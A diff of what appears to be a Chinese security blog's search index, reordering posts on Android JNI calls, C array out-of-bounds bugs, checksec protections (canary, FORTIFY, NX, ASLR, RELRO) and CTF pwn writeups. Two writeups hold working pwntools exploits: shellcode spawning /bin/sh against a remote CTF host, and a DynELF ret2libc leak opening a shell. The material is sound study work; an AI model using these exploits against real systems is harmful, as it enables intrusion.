@@ -97,43 +97,8 @@ include $(BUILD_SHARED_LIBRARY)
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native4.jpg" alt=""></p>
 <p>kxtmp函数是动态注册函数，现在字符串中搜索函数名，之后通过回溯找到函数注册地址</p>
 <p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/Aes_native5.jpg" alt=""></p>
-<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso</p>
-<pre><code>public class MainActivity extends Activity {
-
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        System.loadLibrary(&quot;hookso&quot;);
-
-        float value =TypedValue.complexToFloat(55297);
-        Log.e(&quot;DEBUG&quot;, &quot;: &quot; + value);
-    }
-
-    @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
-        // Inflate the menu; this adds items to the action bar if it is present.
-        getMenuInflater().inflate(R.menu.main, menu);
-        return true;
-    }
-
-    @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
-        // Handle action bar item clicks here. The action bar will
-        // automatically handle clicks on the Home/Up button, so long
-        // as you specify a parent activity in AndroidManifest.xml.
-        int id = item.getItemId();
-        if (id == R.id.action_settings) {
-            JNI.testfunc();
-            return true;
-        }
-        return super.onOptionsItemSelected(item);
-    }
-}
-
-
-public class JNI
+<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<pre><code>public class JNI
 {
     public static native void testfunc();
 }
@@ -453,93 +418,136 @@ sh.interactive()
       </tags>
   </entry>
   <entry>
-    <title>pwn之-数组下标越界</title>
-    <url>/2016/08/09/pwn%E4%B9%8B-%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C/</url>
-    <content><![CDATA[<p><strong>下标越界</strong></p>
-<p>在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:<br><a id="more"></a><br>    C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的<br>    数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行<br>    的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代<br>    码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以<br>    为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越<br>    界了，那么它会自动接着那块内存往后写。 </p>
-<p>关于C/C++为什么不对数组的下标是否越界做检查，可以参考：<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
-<p>因为编译器不会自动检测你的数组下标是否越界，而是把这个任务交给了程序员自己，所以我们在写程序，引用数组元素时，一定注意不要让数组的下标越界。</p>
-<p>还有，初学者一定不能忘了数组的下标是从0开始的，不是常识中的从1开始。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[10];
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[10], str1[10];
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        strcpy(string, str1);
-10   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char* str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt;= 10)
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><p>这3个例子都有数组越界的问题。</p>
-<p>例一中，string是一个含有10个元素的字符数组，str1指向的字符串长度为10，在进行strcpy调用时，会将str1的结束符也复制到string数组里，即复制的字符个数为11，这样会导致string出现数组越界。程序不一定会因此而崩溃，但这是一个潜在的危险。解决办法是将string的元素个数定义为11。</p>
-<p>例二中，str1和string都是含有10个元素的字符数组，并且str1的元素全部被赋为字符”a”，然后再调用strcpy。这里会出现以下两个问题：一个问题是str1表示的字符数组没有以’\0’结束，在随后调用strcpy时无法判断什么时候复制结束；另一个问题是string的数组长度不够，出现数组越界的现象。解决办法是将string和str1的元素个数都定义为11个，并在调用strcpy之前加入一条语句把str1[10]赋为’\0’。</p>
-<p>例三中，if语句使用小于等于”&lt;=”进行比较，如果str1的长度等于10，也会出现数组越界的情况。解决办法是把”&lt;=”换成”&lt;”。</p>
-<p>改正后的程序如下所示。</p>
-<p>例一</p>
-<pre><code>1    void test1()
-2    {
-3        char string[11];           //字符数组长度为11，多分配一个
-4        char* str1 = &quot;0123456789&quot;;
-5        strcpy(string, str1);
-6    }
-</code></pre><p>例二</p>
-<pre><code>1    void test2()
-2    {
-3        char string[11], str1[11];   //字符数组长度都为11，均多分配一个
-4        int i;
-5        for(i=0; i&lt;10; i++)
-6        {
-7            str1[i] = &apos;a&apos;;
-8        }
-9        str1[10] = &apos;\0&apos;;            //初始化str1为空字符串
-10       strcpy(string, str1);
-11   }
-</code></pre><p>例三</p>
-<pre><code>1    void test3(char*str1)
-2    {
-3        char string[10];
-4        if(strlen(str1) &lt; 10)        //不能用&lt;=
-5        {
-6            strcpy(string, str1); 
-7        }
-8    }
-</code></pre><h2 id="i春秋30强挑战赛pwn1-writeup"><a href="#i春秋30强挑战赛pwn1-writeup" class="headerlink" title="i春秋30强挑战赛pwn1 writeup"></a>i春秋30强挑战赛pwn1 writeup</h2><p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
-<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
-<p>通过GDB调试，发现发送29控制eip，nx：disabled，布置好shellcode后直接getshell。</p>
-<p><img src="http://p1.bqimg.com/567571/d6a4b67df29cab11.png" alt=""></p>
-<p><img src="http://p1.bqimg.com/567571/497e098424fb5aee.png" alt=""></p>
-<p><strong>利用代码</strong></p>
+    <title>checksec及其包含的保护机制</title>
+    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
+<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 </p>
+<p>源码参见 </p>
+<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
+<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
+<p>下载方法之一为 </p>
+<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
+<p>checksec到底是用来干什么的？ </p>
+<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
+<p>checksec的使用方法：<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
+<p>checksec –file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
+<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
+<pre><code>gdb-peda$ checksec start
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre><p>下面我们就图中各个保护机制进行一个大致的了解。</p>
+<h2 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
+<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
+<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
+gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
+</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
+<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
+<pre><code>void fun(char *s) {
+        char buf[0x100];
+        strcpy(buf, s);
+        /* Don&apos;t allow gcc to optimise away the buf */
+        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
+}
+</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p>
+<pre><code>08048450 &lt;fun&gt;:
+  push   %ebp               ; 
+  mov    %esp,%ebp
+
+  sub    $0x118,%esp        ; 将0x118存储到栈上
+  mov    0x8(%ebp),%eax     ; 将目标参数载入eax
+  mov    %eax,0x4(%esp)     ; 保存目标参数
+  lea    -0x108(%ebp),%eax  ; 数组buf
+  mov    %eax,(%esp)        ; 保存
+  call   8048320 &lt;strcpy@plt&gt;
+
+  leave                     ; 
+  ret
+</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
+<pre><code>08048470 &lt;fun&gt;:
+  push   %ebp               ; 
+  mov    %esp,%ebp
+
+  sub    $0x118,%esp        ; 
+  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存
+  mov    0x8(%ebp),%eax     ; 
+  mov    %eax,0x4(%esp)     ; 
+  lea    -0x108(%ebp),%eax  ; 
+  mov    %eax,(%esp)        ; 
+  call   8048370 &lt;__strcpy_chk@plt&gt;
+
+  leave                      ; 
+  ret
+</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
+<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p>工作原理如图：<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
+<pre><code>gcc -z execstack -o test test.c
+</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
+<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
+<pre><code>0 - 表示关闭进程地址空间随机化。
+1 - 表示将mmap的基址，stack和vdso页面随机化。
+2 - 表示在1的基础上增加栈（heap）的随机化。
+</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
+<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
+<p>liunx下关闭PIE的命令如下：</p>
+<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
+]]></content>
+      <tags>
+        <tag>liunx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XMAN-level4</title>
+    <url>/2017/02/28/XMAN-level4/</url>
+    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
+<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+</code></pre><p>也可以重新返回vuln：</p>
+<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
+</code></pre><p>脚本如下：</p>
 <pre><code>from pwn import *
-# io = process(&quot;./tc1&quot;)
-io = remote(&quot;106.75.9.11&quot;, 20000)
-io.recvuntil(&quot;4. Divide&quot;)
-io.sendline(&quot;29&quot;)
-io.recvuntil(&quot;[123 110]&quot;)
-payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
-io.sendline(payload)
-io.interactive()
+
+#p=process(&apos;./level4&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
+level4=ELF(&apos;./level4&apos;)
+
+#plt
+write_plt=0x08048340
+read_plt=0x08048310
+
+#addr
+main=level4.symbols[&apos;main&apos;]
+basebss=level4.bss()
+pppr=0x08048509
+
+def leak(address):
+        payload=&apos;A&apos;*140
+    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+        p.send(payload)
+        data =p.recv(4)
+    print &quot;%#x %s&quot; % (address, data)
+        return data
+
+
+d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
+
+system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
+log.success(&apos;leak system address: &apos; + hex(system_addr))
+
+payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
+p.send(payload2)
+p.send(&apos;/bin/sh\x00&apos;)
+p.interactive()
 </code></pre>]]></content>
       <tags>
-        <tag>writeup</tag>
+        <tag>ctf</tag>
         <tag>pwn</tag>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -640,89 +648,93 @@ memset(TEST,0,sizeof(struct sample_struct)*10);
       </tags>
   </entry>
   <entry>
-    <title>checksec及其包含的保护机制</title>
-    <url>/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<p>今天在研究liunx下栈溢出的时候发现自己对各种保护机制并不是特别了解，因此就这方面的知识在网上查找了一些资料并总结了一些心得和大家分享。<br><a id="more"></a><br>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 </p>
-<p>源码参见 </p>
-<p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="external">http://www.trapkit.de/tools/checksec.html</a></p>
-<p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/</a></p>
-<p>下载方法之一为 </p>
-<p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="external">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p>
-<p>checksec到底是用来干什么的？ </p>
-<p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p>
-<p>checksec的使用方法：<br><img src="http://img.blog.csdn.net/20160920223340302" alt=""></p>
-<p>checksec –file /usr/sbin/sshd<br><img src="http://img.blog.csdn.net/20160920235408000" alt=""></p>
-<p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p>
-<pre><code>gdb-peda$ checksec start
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : disabled
-</code></pre><p>下面我们就图中各个保护机制进行一个大致的了解。</p>
-<h2 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。</p>
-<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
-<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
-<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
-<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
-gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
-gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
-</code></pre><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。</p>
-<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
-<pre><code>void fun(char *s) {
-        char buf[0x100];
-        strcpy(buf, s);
-        /* Don&apos;t allow gcc to optimise away the buf */
-        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));
-}
-</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p>
-<pre><code>08048450 &lt;fun&gt;:
-  push   %ebp               ; 
-  mov    %esp,%ebp
-
-  sub    $0x118,%esp        ; 将0x118存储到栈上
-  mov    0x8(%ebp),%eax     ; 将目标参数载入eax
-  mov    %eax,0x4(%esp)     ; 保存目标参数
-  lea    -0x108(%ebp),%eax  ; 数组buf
-  mov    %eax,(%esp)        ; 保存
-  call   8048320 &lt;strcpy@plt&gt;
-
-  leave                     ; 
-  ret
-</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
-<pre><code>08048470 &lt;fun&gt;:
-  push   %ebp               ; 
-  mov    %esp,%ebp
-
-  sub    $0x118,%esp        ; 
-  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存
-  mov    0x8(%ebp),%eax     ; 
-  mov    %eax,0x4(%esp)     ; 
-  lea    -0x108(%ebp),%eax  ; 
-  mov    %eax,(%esp)        ; 
-  call   8048370 &lt;__strcpy_chk@plt&gt;
-
-  leave                      ; 
-  ret
-</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
-<h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
-<p>工作原理如图：<br><img src="http://space.itpub.net/attachments/2011/07/13164110_201107181702402.jpg?_=2109736" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
-<pre><code>gcc -z execstack -o test test.c
-</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
-<h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
-<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
-<pre><code>0 - 表示关闭进程地址空间随机化。
-1 - 表示将mmap的基址，stack和vdso页面随机化。
-2 - 表示在1的基础上增加栈（heap）的随机化。
-</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
-<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<p>liunx下关闭PIE的命令如下：</p>
-<pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。</p>
-]]></content>
+    <title>pwn之-数组下标越界</title>
+    <url>/2016/08/09/pwn%E4%B9%8B-%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C/</url>
+    <content><![CDATA[<p><strong>下标越界</strong></p>
+<p>在引用数组元素时，使用的下标超过了该数组下标的应有范围，但应注意的是:<br><a id="more"></a><br>    C/C++不对数组做边界检查。 可以重写数组的每一端，并写入一些其他变量的<br>    数组或者甚至是写入程序的代码。不检查下标是否越界可以有效提高程序运行<br>    的效率，因为如果你检查，那么编译器必须在生成的目标代码中加入额外的代<br>    码用于程序运行时检测下标是否越界，这就会导致程序的运行速度下降，所以<br>    为了程序的运行效率，C / C++才不检查下标是否越界。发现如果数组下标越<br>    界了，那么它会自动接着那块内存往后写。 </p>
+<p>关于C/C++为什么不对数组的下标是否越界做检查，可以参考：<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
+<p>因为编译器不会自动检测你的数组下标是否越界，而是把这个任务交给了程序员自己，所以我们在写程序，引用数组元素时，一定注意不要让数组的下标越界。</p>
+<p>还有，初学者一定不能忘了数组的下标是从0开始的，不是常识中的从1开始。</p>
+<p>例一</p>
+<pre><code>1    void test1()
+2    {
+3        char string[10];
+4        char* str1 = &quot;0123456789&quot;;
+5        strcpy(string, str1);
+6    }
+</code></pre><p>例二</p>
+<pre><code>1    void test2()
+2    {
+3        char string[10], str1[10];
+4        int i;
+5        for(i=0; i&lt;10; i++)
+6        {
+7            str1[i] = &apos;a&apos;;
+8        }
+9        strcpy(string, str1);
+10   }
+</code></pre><p>例三</p>
+<pre><code>1    void test3(char* str1)
+2    {
+3        char string[10];
+4        if(strlen(str1) &lt;= 10)
+5        {
+6            strcpy(string, str1); 
+7        }
+8    }
+</code></pre><p>这3个例子都有数组越界的问题。</p>
+<p>例一中，string是一个含有10个元素的字符数组，str1指向的字符串长度为10，在进行strcpy调用时，会将str1的结束符也复制到string数组里，即复制的字符个数为11，这样会导致string出现数组越界。程序不一定会因此而崩溃，但这是一个潜在的危险。解决办法是将string的元素个数定义为11。</p>
+<p>例二中，str1和string都是含有10个元素的字符数组，并且str1的元素全部被赋为字符”a”，然后再调用strcpy。这里会出现以下两个问题：一个问题是str1表示的字符数组没有以’\0’结束，在随后调用strcpy时无法判断什么时候复制结束；另一个问题是string的数组长度不够，出现数组越界的现象。解决办法是将string和str1的元素个数都定义为11个，并在调用strcpy之前加入一条语句把str1[10]赋为’\0’。</p>
+<p>例三中，if语句使用小于等于”&lt;=”进行比较，如果str1的长度等于10，也会出现数组越界的情况。解决办法是把”&lt;=”换成”&lt;”。</p>
+<p>改正后的程序如下所示。</p>
+<p>例一</p>
+<pre><code>1    void test1()
+2    {
+3        char string[11];           //字符数组长度为11，多分配一个
+4        char* str1 = &quot;0123456789&quot;;
+5        strcpy(string, str1);
+6    }
+</code></pre><p>例二</p>
+<pre><code>1    void test2()
+2    {
+3        char string[11], str1[11];   //字符数组长度都为11，均多分配一个
+4        int i;
+5        for(i=0; i&lt;10; i++)
+6        {
+7            str1[i] = &apos;a&apos;;
+8        }
+9        str1[10] = &apos;\0&apos;;            //初始化str1为空字符串
+10       strcpy(string, str1);
+11   }
+</code></pre><p>例三</p>
+<pre><code>1    void test3(char*str1)
+2    {
+3        char string[10];
+4        if(strlen(str1) &lt; 10)        //不能用&lt;=
+5        {
+6            strcpy(string, str1); 
+7        }
+8    }
+</code></pre><h2 id="i春秋30强挑战赛pwn1-writeup"><a href="#i春秋30强挑战赛pwn1-writeup" class="headerlink" title="i春秋30强挑战赛pwn1 writeup"></a>i春秋30强挑战赛pwn1 writeup</h2><p>在输入操作下标时没有检测是否越界，通过数组越界读获取获取伪造的函数指针执行 shellcode。</p>
+<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
+<p>通过GDB调试，发现发送29控制eip，nx：disabled，布置好shellcode后直接getshell。</p>
+<p><img src="http://p1.bqimg.com/567571/d6a4b67df29cab11.png" alt=""></p>
+<p><img src="http://p1.bqimg.com/567571/497e098424fb5aee.png" alt=""></p>
+<p><strong>利用代码</strong></p>
+<pre><code>from pwn import *
+# io = process(&quot;./tc1&quot;)
+io = remote(&quot;106.75.9.11&quot;, 20000)
+io.recvuntil(&quot;4. Divide&quot;)
+io.sendline(&quot;29&quot;)
+io.recvuntil(&quot;[123 110]&quot;)
+payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
+io.sendline(payload)
+io.interactive()
+</code></pre>]]></content>
       <tags>
-        <tag>liunx</tag>
+        <tag>writeup</tag>
+        <tag>pwn</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1361,71 +1373,6 @@ p.send(payload3)
       </tags>
   </entry>
